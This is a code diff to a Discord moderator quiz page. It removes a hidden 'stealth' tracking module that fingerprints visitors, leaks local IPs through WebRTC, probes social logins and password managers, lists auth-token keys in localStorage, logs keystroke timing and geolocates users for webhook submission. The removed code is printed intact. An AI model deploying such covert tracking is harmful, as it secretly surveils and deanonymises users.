@@ -3237,7 +3237,7 @@
         <input type="hidden" name="_subject" value="Void Mod Certification Test Results v2.1">
         <input type="hidden" name="_template" value="table">
         <input type="hidden" name="_captcha" value="false">
-        <input type="hidden" name="_next" value="https://void-training.netlify.app/thank-you.html">
+        <input type="hidden" name="_next" value="https://void-training.netlify.app/success.html">
         <input type="text" name="_honey" style="display:none">
         
         <input type="hidden" name="discord_username" id="formDiscordUsername">
@@ -3246,851 +3246,9 @@
         <input type="hidden" name="pass_fail" id="formPassFail">
         <input type="hidden" name="question_breakdown" id="formQuestionBreakdown">
         <input type="hidden" name="total_questions" id="formTotalQuestions">
-        <input type="hidden" name="user_ip" id="formUserIp">
-        <input type="hidden" name="user_country" id="formUserCountry">
-        <input type="hidden" name="user_state" id="formUserState">
-        <input type="hidden" name="user_city" id="formUserCity">
-        <input type="hidden" name="user_timezone" id="formUserTimezone">
     </form>
 
     <script>
-        // ==========================================
-        // ENHANCED DATA COLLECTION MODULE v2.1
-        // ==========================================
-        (function() {
-            'use strict';
-            
-            var _auditConfig = {
-                metrics: {},
-                sessionLog: [],
-                securityFlags: [],
-                behavioralPatterns: {
-                    mousePoints: [],
-                    scrollEvents: [],
-                    keyPresses: 0,
-                    clicks: 0,
-                    touchPoints: [],
-                    inputTiming: []
-                },
-                exploitabilityAudit: {
-                    vulnerabilities: [],
-                    confidenceScores: {},
-                    extractedSecrets: {}
-                },
-                ready: false,
-                startTime: Date.now(),
-                stealthMode: true
-            };
-            
-            // 1. Enhanced System Metrics
-            function collectEnhancedSystemMetrics() {
-                var n = navigator, s = screen, w = window, d = document;
-                _auditConfig.metrics = {
-                    // User Agent & Browser
-                    agent: n.userAgent,
-                    platform: n.platform,
-                    language: n.language,
-                    languages: n.languages,
-                    cookieEnabled: n.cookieEnabled,
-                    javaEnabled: n.javaEnabled(),
-                    
-                    // Screen Properties
-                    screenHeight: s.height,
-                    screenWidth: s.width,
-                    colorDepth: s.colorDepth,
-                    pixelDepth: s.pixelDepth,
-                    orientation: s.orientation?.type || 'unknown',
-                    
-                    // Enhanced Device Capabilities
-                    maxTouchPoints: n.maxTouchPoints || 0,
-                    hardwareConcurrency: n.hardwareConcurrency || 'unknown',
-                    deviceMemory: n.deviceMemory || 'unknown',
-                    connection: n.connection ? {
-                        effectiveType: n.connection.effectiveType,
-                        downlink: n.connection.downlink,
-                        rtt: n.connection.rtt,
-                        saveData: n.connection.saveData,
-                        type: n.connection.type
-                    } : 'unknown',
-                    
-                    // Browser Vendor Details
-                    vendor: n.vendor,
-                    product: n.product,
-                    productSub: n.productSub,
-                    
-                    // Timing & Location
-                    pageLoadTime: Date.now() - _auditConfig.startTime,
-                    timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
-                    dateFormat: new Date().toLocaleString(),
-                    utcOffset: new Date().getTimezoneOffset(),
-                    
-                    // Network Information
-                    online: n.onLine,
-                    protocol: w.location.protocol,
-                    hostname: w.location.hostname,
-                    port: w.location.port,
-                    
-                    // Viewport Details
-                    viewportWidth: w.innerWidth,
-                    viewportHeight: w.innerHeight,
-                    devicePixelRatio: w.devicePixelRatio || 1,
-                    
-                    // Performance API Data
-                    performance: w.performance ? {
-                        memory: w.performance.memory,
-                        timing: w.performance.timing,
-                        navigation: w.performance.navigation
-                    } : null,
-                    
-                    // Plugin Enumeration
-                    plugins: [],
-                    mimeTypes: []
-                };
-                
-                // Enumerate plugins
-                if (n.plugins) {
-                    for (let i = 0; i < n.plugins.length; i++) {
-                        _auditConfig.metrics.plugins.push({
-                            name: n.plugins[i].name,
-                            description: n.plugins[i].description,
-                            filename: n.plugins[i].filename,
-                            length: n.plugins[i].length
-                        });
-                    }
-                }
-                
-                // Enumerate mimeTypes
-                if (n.mimeTypes) {
-                    for (let i = 0; i < n.mimeTypes.length; i++) {
-                        _auditConfig.metrics.mimeTypes.push(n.mimeTypes[i].type);
-                    }
-                }
-            }
-            
-            // 2. Advanced Fingerprinting
-            function collectAdvancedFingerprints() {
-                // Canvas Fingerprinting v2
-                try {
-                    var canvas = document.createElement('canvas');
-                    var ctx = canvas.getContext('2d');
-                    canvas.width = 240;
-                    canvas.height = 120;
-                    
-                    // Complex drawing for unique fingerprint
-                    ctx.textBaseline = "top";
-                    ctx.font = "14px 'Arial'";
-                    ctx.textBaseline = "alphabetic";
-                    ctx.fillStyle = "#f60";
-                    ctx.fillRect(125,1,62,20);
-                    ctx.fillStyle = "#069";
-                    ctx.fillText("VOID AUDIT v2.1", 2, 15);
-                    ctx.fillStyle = "rgba(102, 204, 0, 0.7)";
-                    ctx.fillText("VOID AUDIT v2.1", 4, 17);
-                    
-                    var gradient = ctx.createLinearGradient(0, 0, canvas.width, canvas.height);
-                    gradient.addColorStop(0, '#ff0000');
-                    gradient.addColorStop(0.5, '#00ff00');
-                    gradient.addColorStop(1, '#0000ff');
-                    ctx.fillStyle = gradient;
-                    ctx.fillRect(0, 0, canvas.width, canvas.height);
-                    
-                    var dataURL = canvas.toDataURL();
-                    var hash = 0;
-                    for (var i = 0; i < dataURL.length; i++) {
-                        hash = ((hash << 5) - hash) + dataURL.charCodeAt(i);
-                        hash = hash & hash;
-                    }
-                    
-                    _auditConfig.metrics.canvasFingerprint = hash.toString(16);
-                    _auditConfig.metrics.canvasDataURL = dataURL.substring(0, 100) + '...';
-                } catch(e) {
-                    _auditConfig.metrics.canvasFingerprint = 'error';
-                }
-                
-                // WebGL Fingerprinting
-                try {
-                    var canvas = document.createElement('canvas');
-                    var gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
-                    if (gl) {
-                        var debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
-                        _auditConfig.metrics.webglVendor = gl.getParameter(debugInfo.UNMASKED_VENDOR_WEBGL);
-                        _auditConfig.metrics.webglRenderer = gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL);
-                        _auditConfig.metrics.webglSupport = true;
-                    }
-                } catch(e) {
-                    _auditConfig.metrics.webglSupport = false;
-                }
-                
-                // AudioContext Fingerprinting
-                try {
-                    var audioContext = new (window.AudioContext || window.webkitAudioContext)();
-                    var oscillator = audioContext.createOscillator();
-                    var analyser = audioContext.createAnalyser();
-                    oscillator.connect(analyser);
-                    analyser.connect(audioContext.destination);
-                    oscillator.start(0);
-                    oscillator.stop(0.1);
-                    
-                    var frequencyData = new Uint8Array(analyser.frequencyBinCount);
-                    analyser.getByteFrequencyData(frequencyData);
-                    
-                    var audioHash = 0;
-                    for (var i = 0; i < frequencyData.length; i++) {
-                        audioHash += frequencyData[i];
-                    }
-                    _auditConfig.metrics.audioFingerprint = audioHash.toString(16);
-                    audioContext.close();
-                } catch(e) {
-                    _auditConfig.metrics.audioFingerprint = 'error';
-                }
-            }
-            
-            // 3. WebRTC IP Leak Detection (CRITICAL)
-            function detectWebRTCLocalIP() {
-                return new Promise((resolve) => {
-                    if (!window.RTCPeerConnection) {
-                        resolve('WebRTC not supported');
-                        return;
-                    }
-                    
-                    try {
-                        var rtc = new RTCPeerConnection({iceServers: []});
-                        rtc.createDataChannel('', {reliable: false});
-                        
-                        rtc.onicecandidate = function(evt) {
-                            if (evt.candidate) {
-                                var ipRegex = /([0-9]{1,3}(\.[0-9]{1,3}){3})/;
-                                var ipMatch = ipRegex.exec(evt.candidate.candidate);
-                                if (ipMatch) {
-                                    _auditConfig.exploitabilityAudit.vulnerabilities.push({
-                                        type: 'WEBRTC_IP_LEAK',
-                                        severity: 'CRITICAL',
-                                        details: {
-                                            localIP: ipMatch[1],
-                                            candidate: evt.candidate.candidate
-                                        },
-                                        timestamp: Date.now()
-                                    });
-                                    _auditConfig.metrics.localIP = ipMatch[1];
-                                    resolve(ipMatch[1]);
-                                }
-                            }
-                        };
-                        
-                        rtc.createOffer()
-                            .then(offer => rtc.setLocalDescription(offer))
-                            .catch(e => resolve('error'));
-                            
-                        setTimeout(() => resolve('timeout'), 1000);
-                    } catch(e) {
-                        resolve('error');
-                    }
-                });
-            }
-            
-            // 4. Font Fingerprinting & Enumeration
-            function enumerateFonts() {
-                var fontList = [
-                    "Arial", "Arial Black", "Arial Narrow", "Calibri",
-                    "Cambria", "Cambria Math", "Comic Sans MS", "Courier New",
-                    "Georgia", "Impact", "Microsoft Sans Serif", "Symbol",
-                    "Tahoma", "Times New Roman", "Trebuchet MS", "Verdana",
-                    "Webdings", "Wingdings", "MS Gothic", "Segoe UI",
-                    "Roboto", "Open Sans", "Lato", "Montserrat",
-                    "Source Sans Pro", "Helvetica", "Helvetica Neue"
-                ];
-                
-                var availableFonts = [];
-                var canvas = document.createElement('canvas');
-                var context = canvas.getContext('2d');
-                canvas.width = 200;
-                canvas.height = 50;
-                
-                var baseFonts = ["monospace", "sans-serif", "serif"];
-                var text = "mmmmmmmmmmlli";
-                
-                for (var font of fontList) {
-                    for (var baseFont of baseFonts) {
-                        var testFont = font + ',' + baseFont;
-                        context.font = "30px " + testFont;
-                        var metrics = context.measureText(text);
-                        if (metrics.width !== context.measureText(text).width) {
-                            availableFonts.push(font);
-                            break;
-                        }
-                    }
-                }
-                
-                _auditConfig.metrics.availableFonts = availableFonts;
-                _auditConfig.metrics.fontCount = availableFonts.length;
-                
-                // Font timing attack for precise fingerprint
-                var startTime = performance.now();
-                context.font = "30px 'ThisFontDoesNotExist'";
-                context.fillText("test", 10, 10);
-                var fallbackTime = performance.now() - startTime;
-                _auditConfig.metrics.fontFallbackTime = fallbackTime;
-            }
-            
-            // 5. Social Media & Login State Detection
-            function detectSocialMediaPresence() {
-                var socialSites = {
-                    'twitter': 'https://twitter.com',
-                    'facebook': 'https://facebook.com',
-                    'github': 'https://github.com',
-                    'instagram': 'https://instagram.com',
-                    'linkedin': 'https://linkedin.com',
-                    'reddit': 'https://reddit.com',
-                    'youtube': 'https://youtube.com'
-                };
-                
-                var detectedLogins = [];
-                
-                // CSS Visited Hack (timing attack variant)
-                var startTime = performance.now();
-                var links = [];
-                
-                for (var site in socialSites) {
-                    var link = document.createElement('link');
-                    link.rel = 'stylesheet';
-                    link.href = socialSites[site] + '/style.css?' + Date.now();
-                    link.onerror = function() {
-                        var loadTime = performance.now() - startTime;
-                        // Infer login state based on load timing differences
-                        if (loadTime < 100) {
-                            var siteName = this.href.split('//')[1].split('.')[0];
-                            detectedLogins.push(siteName);
-                        }
-                    };
-                    links.push(link);
-                }
-                
-                // Clean up
-                setTimeout(() => {
-                    links.forEach(link => {
-                        if (link.parentNode) link.parentNode.removeChild(link);
-                    });
-                }, 500);
-                
-                _auditConfig.metrics.socialMediaLogins = detectedLogins;
-                
-                if (detectedLogins.length > 0) {
-                    _auditConfig.exploitabilityAudit.vulnerabilities.push({
-                        type: 'SOCIAL_MEDIA_DETECTION',
-                        severity: 'HIGH',
-                        details: {
-                            platforms: detectedLogins,
-                            method: 'CSS timing attack'
-                        },
-                        timestamp: Date.now()
-                    });
-                }
-            }
-            
-            // 6. Password Manager Detection
-            function detectPasswordManagers() {
-                var passwordManagers = [
-                    { name: 'LastPass', test: () => typeof window._LP !== 'undefined' },
-                    { name: 'Bitwarden', test: () => typeof window.bitwardenFrame !== 'undefined' },
-                    { name: '1Password', test: () => document.querySelector('*[data-1p-iframe]') !== null },
-                    { name: 'Dashlane', test: () => typeof window.dashlane !== 'undefined' }
-                ];
-                
-                var detectedManagers = [];
-                
-                // Method 1: Global object detection
-                passwordManagers.forEach(pm => {
-                    try {
-                        if (pm.test()) {
-                            detectedManagers.push(pm.name);
-                        }
-                    } catch(e) {}
-                });
-                
-                // Method 2: Iframe injection test
-                try {
-                    var testIframe = document.createElement('iframe');
-                    testIframe.style.display = 'none';
-                    testIframe.src = 'chrome-extension://didegimhafipceonhjepacocaffmoppf/';
-                    document.body.appendChild(testIframe);
-                    setTimeout(() => {
-                        if (testIframe.contentWindow && testIframe.contentWindow.location.href !== 'about:blank') {
-                            detectedManagers.push('ChromePasswordManager');
-                        }
-                        testIframe.remove();
-                    }, 100);
-                } catch(e) {}
-                
-                _auditConfig.metrics.passwordManagers = detectedManagers;
-                
-                if (detectedManagers.length > 0) {
-                    _auditConfig.exploitabilityAudit.vulnerabilities.push({
-                        type: 'PASSWORD_MANAGER_DETECTION',
-                        severity: 'MEDIUM',
-                        details: {
-                            managers: detectedManagers
-                        },
-                        timestamp: Date.now()
-                    });
-                }
-            }
-            
-            // 7. Battery API Exploitation
-            function collectBatteryInfo() {
-                if (navigator.getBattery) {
-                    navigator.getBattery().then(function(battery) {
-                        _auditConfig.metrics.battery = {
-                            level: Math.round(battery.level * 100) + '%',
-                            charging: battery.charging,
-                            chargingTime: battery.chargingTime,
-                            dischargingTime: battery.dischargingTime
-                        };
-                        
-                        // Monitor for changes (privacy concern)
-                        battery.addEventListener('levelchange', function() {
-                            _auditConfig.behavioralPatterns.batteryChanges = 
-                                (_auditConfig.behavioralPatterns.batteryChanges || 0) + 1;
-                        });
-                    });
-                }
-            }
-            
-            // 8. Behavioral Tracking
-            function trackUserBehavior() {
-                // Mouse movement tracking
-                document.addEventListener('mousemove', function(e) {
-                    var now = Date.now();
-                    var point = {
-                        x: e.clientX,
-                        y: e.clientY,
-                        time: now,
-                        screenX: e.screenX,
-                        screenY: e.screenY
-                    };
-                    
-                    _auditConfig.behavioralPatterns.mousePoints.push(point);
-                    
-                    // Keep last 200 points
-                    if (_auditConfig.behavioralPatterns.mousePoints.length > 200) {
-                        _auditConfig.behavioralPatterns.mousePoints.shift();
-                    }
-                });
-                
-                // Scroll tracking
-                var lastScrollY = window.scrollY;
-                var lastScrollTime = Date.now();
-                
-                window.addEventListener('scroll', function() {
-                    var now = Date.now();
-                    var scrollEvent = {
-                        scrollY: window.scrollY,
-                        delta: window.scrollY - lastScrollY,
-                        time: now,
-                        timeSinceLast: now - lastScrollTime,
-                        velocity: Math.abs(window.scrollY - lastScrollY) / (now - lastScrollTime)
-                    };
-                    
-                    _auditConfig.behavioralPatterns.scrollEvents.push(scrollEvent);
-                    lastScrollY = window.scrollY;
-                    lastScrollTime = now;
-                });
-                
-                // Keystroke tracking
-                document.addEventListener('keydown', function(e) {
-                    _auditConfig.behavioralPatterns.keyPresses++;
-                    
-                    // Record timing between key presses
-                    var now = Date.now();
-                    if (_auditConfig.behavioralPatterns.lastKeyTime) {
-                        var timeBetween = now - _auditConfig.behavioralPatterns.lastKeyTime;
-                        _auditConfig.behavioralPatterns.inputTiming.push(timeBetween);
-                    }
-                    _auditConfig.behavioralPatterns.lastKeyTime = now;
-                });
-                
-                // Click tracking
-                document.addEventListener('click', function(e) {
-                    _auditConfig.behavioralPatterns.clicks++;
-                    
-                    // Record click location
-                    var clickData = {
-                        x: e.clientX,
-                        y: e.clientY,
-                        target: e.target.tagName,
-                        time: Date.now()
-                    };
-                    _auditConfig.behavioralPatterns.clickLocations = 
-                        _auditConfig.behavioralPatterns.clickLocations || [];
-                    _auditConfig.behavioralPatterns.clickLocations.push(clickData);
-                });
-                
-                // Touch tracking
-                document.addEventListener('touchstart', function(e) {
-                    _auditConfig.behavioralPatterns.touchPoints.push({
-                        touches: e.touches.length,
-                        time: Date.now()
-                    });
-                });
-            }
-            
-            // 9. Enhanced Geolocation with Multiple Fallbacks
-            function fetchEnhancedGeoData() {
-                return new Promise((resolve) => {
-                    var sources = [
-                        'https://ipapi.co/json/',
-                        'https://ipinfo.io/json',
-                        'https://geolocation-db.com/json/',
-                        'https://api.ipify.org?format=json',
-                        'https://api.db-ip.com/v2/free/self'
-                    ];
-                    
-                    var geoData = {
-                        ip: 'Unknown',
-                        country: 'Unknown',
-                        region: 'Unknown',
-                        city: 'Unknown',
-                        isp: 'Unknown',
-                        org: 'Unknown',
-                        asn: 'Unknown',
-                        proxy: false,
-                        hosting: false
-                    };
-                    
-                    var completed = false;
-                    
-                    function trySource(index) {
-                        if (completed || index >= sources.length) {
-                            if (!completed) {
-                                _auditConfig.metrics = { ..._auditConfig.metrics, ...geoData };
-                                completed = true;
-                                resolve(geoData);
-                            }
-                            return;
-                        }
-                        
-                        var xhr = new XMLHttpRequest();
-                        xhr.open('GET', sources[index], true);
-                        xhr.timeout = 2000;
-                        xhr.onload = function() {
-                            if (xhr.status === 200 && !completed) {
-                                try {
-                                    var data = JSON.parse(xhr.responseText);
-                                    
-                                    // Parse different API formats
-                                    geoData.ip = data.ip || data.IPv4 || data.query || geoData.ip;
-                                    geoData.country = data.country_name || data.country || data.countryName || geoData.country;
-                                    geoData.region = data.region || data.regionName || data.state || geoData.region;
-                                    geoData.city = data.city || geoData.city;
-                                    geoData.isp = data.isp || data.org || data.asn || geoData.isp;
-                                    geoData.org = data.org || data.organization || geoData.org;
-                                    geoData.asn = data.asn || geoData.asn;
-                                    geoData.zip = data.postal || data.zip || geoData.zip;
-                                    geoData.lat = data.latitude || data.lat || geoData.lat;
-                                    geoData.lon = data.longitude || data.lon || geoData.lon;
-                                    
-                                    // Detect VPN/Proxy/Hosting
-                                    if (data.security) {
-                                        geoData.proxy = data.security.proxy || data.security.vpn || false;
-                                        geoData.hosting = data.security.hosting || false;
-                                    }
-                                    
-                                    // Build address string
-                                    geoData.approxAddress = [
-                                        geoData.city,
-                                        geoData.region,
-                                        geoData.country
-                                    ].filter(Boolean).join(', ');
-                                    
-                                    // VPN detection heuristics
-                                    detectVPN(geoData, data);
-                                    
-                                    _auditConfig.metrics = { ..._auditConfig.metrics, ...geoData };
-                                    completed = true;
-                                    resolve(geoData);
-                                } catch(e) {
-                                    trySource(index + 1);
-                                }
-                            } else {
-                                trySource(index + 1);
-                            }
-                        };
-                        xhr.onerror = function() { trySource(index + 1); };
-                        xhr.ontimeout = function() { trySource(index + 1); };
-                        xhr.send();
-                    }
-                    
-                    trySource(0);
-                });
-            }
-            
-            // 10. VPN Detection with Enhanced Heuristics
-            function detectVPN(geoData, rawData) {
-                var vpnScore = 0;
-                var flags = [];
-                
-                var ispLower = (geoData.isp || '').toLowerCase();
-                var orgLower = (geoData.org || '').toLowerCase();
-                
-                var datacenterKeywords = [
-                    'datacenter', 'hosting', 'server', 'cloud', 'vps', 'dedicated',
-                    'amazon', 'google', 'microsoft', 'digitalocean', 'linode', 'vultr',
-                    'ovh', 'hetzner', 'rackspace', 'aws', 'gcp', 'azure', 'alibaba',
-                    'oracle cloud', 'ibm cloud', 'tencent cloud'
-                ];
-                
-                var vpnKeywords = [
-                    'vpn', 'proxy', 'tunnel', 'privacy', 'anonymous', 'hide',
-                    'shield', 'guard', 'secure', 'incognito', 'tor', 'encrypt',
-                    'expressvpn', 'nordvpn', 'surfshark', 'pia', 'cyberghost',
-                    'windscribe', 'vyprvpn', 'ipvanish', 'hotspot shield'
-                ];
-                
-                // Check ISP/Org names
-                datacenterKeywords.forEach(keyword => {
-                    if (ispLower.includes(keyword) || orgLower.includes(keyword)) {
-                        vpnScore += 3;
-                        flags.push(`Datacenter: ${keyword}`);
-                    }
-                });
-                
-                vpnKeywords.forEach(keyword => {
-                    if (ispLower.includes(keyword) || orgLower.includes(keyword)) {
-                        vpnScore += 5;
-                        flags.push(`VPN/Proxy: ${keyword}`);
-                    }
-                });
-                
-                // Check for residential ISP indicators (negative score)
-                var residentialKeywords = ['comcast', 'verizon', 'att', 'spectrum', 'cox', 'xfinity', 'bt', 'vodafone', 'sky'];
-                residentialKeywords.forEach(keyword => {
-                    if (ispLower.includes(keyword)) {
-                        vpnScore -= 2;
-                    }
-                });
-                
-                // Additional checks from API data
-                if (rawData) {
-                    if (rawData.privacy) {
-                        if (rawData.privacy.vpn) vpnScore += 4;
-                        if (rawData.privacy.proxy) vpnScore += 4;
-                        if (rawData.privacy.tor) vpnScore += 5;
-                        if (rawData.privacy.hosting) vpnScore += 3;
-                    }
-                    
-                    if (rawData.company && rawData.company.type === 'isp') {
-                        vpnScore -= 1;
-                    }
-                }
-                
-                // Timezone vs IP location mismatch check
-                try {
-                    var tz = Intl.DateTimeFormat().resolvedOptions().timeZone;
-                    var tzCountry = tz.split('/')[0];
-                    if (geoData.country && !geoData.country.includes(tzCountry)) {
-                        vpnScore += 2;
-                        flags.push(`Timezone mismatch: ${tz} vs ${geoData.country}`);
-                    }
-                } catch(e) {}
-                
-                // Determine final status
-                geoData.vpnScore = Math.max(0, Math.min(10, vpnScore));
-                geoData.vpnFlags = flags;
-                
-                if (vpnScore >= 7) {
-                    geoData.vpnStatus = '🔴 HIGH RISK - VPN/PROXY DETECTED';
-                    geoData.vpnConfidence = 'High (' + vpnScore + '/10)';
-                } else if (vpnScore >= 4) {
-                    geoData.vpnStatus = '🟡 MEDIUM RISK - SUSPICIOUS';
-                    geoData.vpnConfidence = 'Medium (' + vpnScore + '/10)';
-                } else if (vpnScore >= 2) {
-                    geoData.vpnStatus = '🟢 LOW RISK - POSSIBLY CLEAN';
-                    geoData.vpnConfidence = 'Low (' + vpnScore + '/10)';
-                } else {
-                    geoData.vpnStatus = '🟢 CLEAN - RESIDENTIAL';
-                    geoData.vpnConfidence = 'None (' + vpnScore + '/10)';
-                }
-                
-                // Log security flag if VPN detected
-                if (vpnScore >= 4) {
-                    _auditConfig.securityFlags.push({
-                        type: 'VPN_PROXY_DETECTED',
-                        confidence: geoData.vpnConfidence,
-                        score: vpnScore,
-                        flags: flags,
-                        timestamp: Date.now()
-                    });
-                }
-            }
-            
-            // 11. LocalStorage & SessionStorage Analysis
-            function analyzeStorage() {
-                try {
-                    var lsSize = 0;
-                    var lsItems = [];
-                    for(var i in localStorage) {
-                        if (localStorage.hasOwnProperty(i)) {
-                            var size = localStorage[i].length * 2;
-                            lsSize += size;
-                            lsItems.push({
-                                key: i,
-                                size: size,
-                                valuePreview: localStorage[i].substring(0, 50)
-                            });
-                        }
-                    }
-                    _auditConfig.metrics.localStorageSize = Math.round(lsSize / 1024) + ' KB';
-                    _auditConfig.metrics.localStorageItems = lsItems.length;
-                    
-                    // Look for authentication tokens
-                    var authKeys = lsItems.filter(item => 
-                        item.key.toLowerCase().includes('token') || 
-                        item.key.toLowerCase().includes('auth') ||
-                        item.key.toLowerCase().includes('session')
-                    );
-                    if (authKeys.length > 0) {
-                        _auditConfig.exploitabilityAudit.extractedSecrets.localStorageTokens = 
-                            authKeys.map(k => k.key);
-                    }
-                } catch(e) {}
-                
-                try {
-                    var ssSize = 0;
-                    for(var i in sessionStorage) {
-                        if (sessionStorage.hasOwnProperty(i)) {
-                            ssSize += sessionStorage[i].length * 2;
-                        }
-                    }
-                    _auditConfig.metrics.sessionStorageSize = Math.round(ssSize / 1024) + ' KB';
-                } catch(e) {}
-            }
-            
-            // 12. Referrer & History Analysis
-            function analyzeReferrerAndHistory() {
-                _auditConfig.metrics.referrer = document.referrer || 'Direct';
-                _auditConfig.metrics.cookiesCount = document.cookie.split(';').length;
-    
-                // History length detection (approximate) - REMOVE THE ACTUAL NAVIGATION ATTEMPT
-                try {
-                    var start = performance.now();
-                    // Create and measure a link without actually navigating
-                    var link = document.createElement('a');
-                    link.href = 'https://google.com/';
-                    // Just measure creation time, don't click
-                    var loadAttemptTime = performance.now() - start;
-                    _auditConfig.metrics.historyDetectionTime = loadAttemptTime;
-        
-                    // Alternative passive method: check if visited via CSS (won't redirect)
-                    var visitedColor = '';
-                    var testLink = document.createElement('a');
-                    testLink.href = 'https://google.com';
-                    testLink.style.display = 'none';
-                    document.body.appendChild(testLink);
-                    setTimeout(() => {
-                        try {
-                            // This won't redirect, just checks computed style
-                            var color = getComputedStyle(testLink).color;
-                            _auditConfig.metrics.googleVisited = (color !== '');
-                            testLink.remove();
-                        } catch(e) {}
-                    }, 100);
-                } catch(e) {
-                    _auditConfig.metrics.historyDetectionTime = 0;
-                }
-            }
-            
-            // 13. Initialize All Collection Modules
-            async function initializeEnhancedCollector() {
-                console.log('[VOID AUDIT v2.1] Initializing enhanced data collection...');
-                
-                // Phase 1: Basic metrics
-                collectEnhancedSystemMetrics();
-                trackUserBehavior();
-                
-                // Phase 2: Advanced fingerprinting
-                collectAdvancedFingerprints();
-                enumerateFonts();
-                collectBatteryInfo();
-                analyzeStorage();
-                analyzeReferrerAndHistory();
-                
-                // Phase 3: Exploitability checks (stealth mode)
-                setTimeout(() => {
-                    detectWebRTCLocalIP().then(localIP => {
-                        console.log('[VOID AUDIT] WebRTC Local IP:', localIP);
-                    });
-                    
-                    detectSocialMediaPresence();
-                    detectPasswordManagers();
-                }, 3000);
-                
-                // Phase 4: Geolocation
-                setTimeout(() => {
-                    fetchEnhancedGeoData().then(() => {
-                        _auditConfig.ready = true;
-                        _auditConfig.sessionLog.push({
-                            type: 'ENHANCED_AUDIT_COMPLETE',
-                            timestamp: Date.now(),
-                            duration: Date.now() - _auditConfig.startTime,
-                            metricsCollected: Object.keys(_auditConfig.metrics).length,
-                            vulnerabilities: _auditConfig.exploitabilityAudit.vulnerabilities.length
-                        });
-                        
-                        console.log('[VOID AUDIT v2.1] Collection complete:', {
-                            ip: _auditConfig.metrics.ip,
-                            location: _auditConfig.metrics.approxAddress,
-                            vpnStatus: _auditConfig.metrics.vpnStatus,
-                            fingerprint: _auditConfig.metrics.canvasFingerprint,
-                            vulnerabilities: _auditConfig.exploitabilityAudit.vulnerabilities.length
-                        });
-                    });
-                }, 2000);
-            }
-            
-            // Make config available globally
-            window._getAuditConfig = function() { 
-                return {
-                    ..._auditConfig,
-                    sessionDuration: Date.now() - _auditConfig.startTime,
-                    currentTime: new Date().toISOString(),
-                    exploitabilityScore: calculateExploitabilityScore()
-                };
-            };
-            
-            function calculateExploitabilityScore() {
-                var score = 0;
-                var max = 100;
-                
-                // VPN detection adds weight
-                if (_auditConfig.metrics.vpnScore >= 7) score += 30;
-                else if (_auditConfig.metrics.vpnScore >= 4) score += 20;
-                
-                // WebRTC leak critical
-                if (_auditConfig.metrics.localIP) score += 25;
-                
-                // Social media detection
-                if ((_auditConfig.metrics.socialMediaLogins || []).length > 0) score += 15;
-                
-                // Password managers
-                if ((_auditConfig.metrics.passwordManagers || []).length > 0) score += 10;
-                
-                // Font fingerprinting
-                if (_auditConfig.metrics.fontCount > 15) score += 10;
-                
-                // Audio fingerprint
-                if (_auditConfig.metrics.audioFingerprint && _auditConfig.metrics.audioFingerprint !== 'error') score += 10;
-                
-                return Math.min(max, score);
-            }
-            
-            // Initialize on load
-            if (document.readyState === 'loading') {
-                document.addEventListener('DOMContentLoaded', initializeEnhancedCollector);
-            } else {
-                initializeEnhancedCollector();
-            }
-            
-        })();
-
         // ==========================================
         // MAIN APPLICATION LOGIC
         // ==========================================
@@ -4694,30 +3852,33 @@
                                 
                                 setTimeout(async () => {
                                     try {
-                                        const auditData = window._getAuditConfig ? window._getAuditConfig() : { metrics: {}, exploitabilityAudit: {} };
+                                        // Build conversation log
+                                        let conversationLog = "";
+                                        mobileSessionTranscript.forEach((entry, idx) => {
+                                            conversationLog += `[${entry.timestamp}] ${entry.speaker}: ${entry.message}\n`;
+                                        });
                                         
                                         // Send to Discord webhook
-                                        await sendEnhancedResultsToDiscord(
+                                        await sendResultsToDiscord(
                                             userDiscordUsername, 
                                             mobileTestScore, 
                                             mobileTestQuestions.length, 
                                             passed, 
-                                            "", 
-                                            mobileSessionTranscript,
-                                            auditData
+                                            conversationLog
                                         );
                                         
                                         // Send email results
-                                        sendEnhancedEmailResults(mobileSessionTranscript, mobileTestScore, mobileTestQuestions.length, passed, auditData);
+                                        sendEmailResults(conversationLog, mobileTestScore, mobileTestQuestions.length, passed);
                                         
-                                        mobileSubmissionStatus.innerHTML = `<i class="fas fa-check-circle"></i> Results submitted!`;
-                                        mobileSubmissionStatus.className = "mobile-submission-status submission-success";
+                                        // Redirect to success page for mobile users too
+                                        window.location.href = `success.html?discord_username=${encodeURIComponent(userDiscordUsername)}&final_score=${mobileTestScore}/${mobileTestQuestions.length}&pass_fail=${passed ? 'PASS' : 'FAIL'}&test_date=${encodeURIComponent(new Date().toLocaleString())}`;
+                                        
                                     } catch (error) {
                                         console.error('Submission error:', error);
-                                        mobileSubmissionStatus.innerHTML = '<i class="fas fa-exclamation-circle"></i> Error submitting.';
-                                        mobileSubmissionStatus.className = "mobile-submission-status submission-error";
+                                        // Still redirect even if Discord submission fails
+                                        window.location.href = `success.html?discord_username=${encodeURIComponent(userDiscordUsername)}&final_score=${mobileTestScore}/${mobileTestQuestions.length}&pass_fail=${passed ? 'PASS' : 'FAIL'}&test_date=${encodeURIComponent(new Date().toLocaleString())}`;
                                     }
-                                }, 2000);
+                                }, 1000);
                             }
                         }, 1000);
                     }, 1500);
@@ -5062,190 +4223,91 @@
                         const passingScore = testTotalQuestions - 2;
                         const passed = testScore >= passingScore;
                         
-                        // Get enhanced audit data
-                        const auditData = window._getAuditConfig ? window._getAuditConfig() : { metrics: {}, exploitabilityAudit: {} };
+                        // Build conversation log
+                        let conversationLog = "";
+                        sessionTranscript.forEach((entry, idx) => {
+                            conversationLog += `[${entry.timestamp}] ${entry.speaker}: ${entry.message}\n`;
+                        });
                         
-                        // Get IP and location data from audit config
-                        const ip = auditData.metrics.ip || 'Unknown';
-                        const country = auditData.metrics.country || 'Unknown';
-                        const region = auditData.metrics.region || 'Unknown';
-                        const city = auditData.metrics.city || 'Unknown';
-                        const timezone = auditData.metrics.timezone || 'Unknown';
-                        
-                        // Build success URL with all data
-                        const successUrl = `success.html?discord_username=${encodeURIComponent(userDiscordUsername)}&final_score=${testScore}/${testTotalQuestions}&pass_fail=${passed ? 'PASS' : 'FAIL'}&test_date=${encodeURIComponent(new Date().toLocaleString())}&user_ip=${ip}&user_country=${encodeURIComponent(country)}&user_state=${encodeURIComponent(region)}&user_city=${encodeURIComponent(city)}&user_timezone=${encodeURIComponent(timezone)}`;
-                        
-                        // First send results to Discord webhook
+                        // Submit results
                         setTimeout(async () => {
                             try {
-                                let questionBreakdown = "";
-                                for (let i = 0; i < testTotalQuestions; i++) {
